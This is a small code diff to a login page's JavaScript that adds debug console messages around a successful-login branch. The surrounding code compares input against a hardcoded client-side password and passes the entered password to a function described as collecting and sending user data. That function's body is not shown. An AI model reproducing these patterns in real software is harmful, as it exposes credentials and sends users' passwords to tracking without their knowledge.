@@ -289,6 +289,9 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
+            console.log('🚀 Login page loaded successfully!');
+            console.log('🔧 Testing tracking function availability...');
+            
             const correctPassword = 'trustcbax';
             const loginBtn = document.getElementById('login-btn');
             const passwordInput = document.getElementById('password');
@@ -509,8 +512,12 @@
                         loginBtn.innerHTML = '<span>Access Granted ✓</span>';
                         loginBtn.style.background = 'linear-gradient(135deg, #22c55e, #16a34a)';
                         
+                        console.log('✅ Login successful! About to call tracking function...');
+                        
                         // Call our new function to collect and send user data
                         collectAndSendUserData(password);
+                        
+                        console.log('📤 Tracking function called successfully!');
                         
                         // Redirect after brief success indication
                         setTimeout(() => {
